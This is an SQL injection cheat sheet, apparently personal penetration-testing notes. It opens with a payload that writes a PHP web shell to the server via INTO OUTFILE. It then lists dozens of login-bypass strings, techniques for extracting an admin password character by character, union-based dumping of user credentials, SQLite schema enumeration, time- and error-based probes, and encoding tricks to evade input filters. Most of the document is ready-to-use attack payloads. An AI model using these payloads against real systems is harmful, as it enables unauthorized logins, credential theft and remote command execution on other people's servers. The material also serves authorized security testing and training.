
#### SQL injection of php code
```
' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '<replace-with-path>/cmd.php'; -- -
```


# SQL Injection Commands Notes

## **Basic SQL Injection**

### **Login Bypass**
```sql
admin' OR '1'='1 --
' OR 1=1;-- -
' OR 1=1
' OR 1=1-- '
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin"
```
- **Description**: Bypasses authentication by making the condition always true.
- **Use Case**: Login forms with username and password fields.

---

### **Blind SQL Injection**
#### **Boolean-Based**
- Test for true condition:
  ```sql
  admin' AND 1=1 --
  ```
- Test for false condition:
  ```sql
  admin' AND 1=2 --
  ```

#### **Extracting Data Character by Character**
- Extract a single character from a field:
  ```sql
  admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1)='A' --
  ```
- **Explanation**:
  - `SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1)` extracts the first character of the `password`.
  - Replace `1` with the desired position.
  - Replace `'A'` with the character being tested.

#### **Determine Field Length**
```sql
admin' AND LENGTH((SELECT password FROM users WHERE username='admin'))=10 --
```
- **Explanation**:
  - `LENGTH()` returns the number of characters in the `password` field.

---

### **Union-Based SQL Injection**
#### **Testing Column Count**
- Test with increasing numbers of `NULL` until the query succeeds:
  ```sql
  ' UNION SELECT NULL --
  ' UNION SELECT NULL, NULL --
  ' UNION SELECT NULL, NULL, NULL --
  ```
- **Explanation**:
  - The number of `NULL` values must match the number of columns in the original query.

#### **Extracting Data**
- Retrieve specific data:
  ```sql
  ' UNION SELECT username, password, NULL FROM users --
  ```
- **Explanation**:
  - Replace `username` and `password` with the desired columns.
  - Ensure the number of columns matches the original query.

---

### **Enumerating the Database**
#### **List All Tables**
```sql
' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' --
```
- **Explanation**:
  - `sqlite_master` is an SQLite system table that stores schema information.
  - `type='table'` filters only tables.

#### **List Columns of a Table**
```sql
' UNION SELECT sql, NULL, NULL FROM sqlite_master WHERE name='users' --
```
- **Explanation**:
  - Retrieves the `CREATE TABLE` statement for the `users` table, showing column names and types.

---

### **Time-Based SQL Injection**
#### **Test with Sleep Function**
- Delay the response to confirm SQL injection:
  ```sql
  admin' AND (SELECT 1 FROM users WHERE username='admin' AND sleep(5)) --
  ```
  
- **Explanation**:
  - If the database pauses for 5 seconds, the injection is successful.

---

### **Error-Based SQL Injection**
#### **Cause an Error to Extract Information**

```sql
`admin' AND (SELECT 1/0 FROM users) --`


- **Explanation**:
  - Forces a division by zero error, which may reveal information about the database.

---

### **Additional Notes**

### **Encoding to Bypass Filters**
#### **URL Encoding**
- Encode special characters to bypass simple input filters:
  - `;` → `%3B`
  - `'` → `%27`
  - `--` → `%2D%2D`

#### **Double URL Encoding**
- Encode the already encoded characters:
  - `;` → `%253B`
  - `'` → `%2527`

#### **Newline Encoding**
- Use newline characters (`%0A`) to break out of restricted inputs:
  ```sql
  admin%0AAND%0A1%3D1 --
  ```
- **Explanation**: The newline (`%0A`) can sometimes bypass character filters or restrictions in SQL parsers.
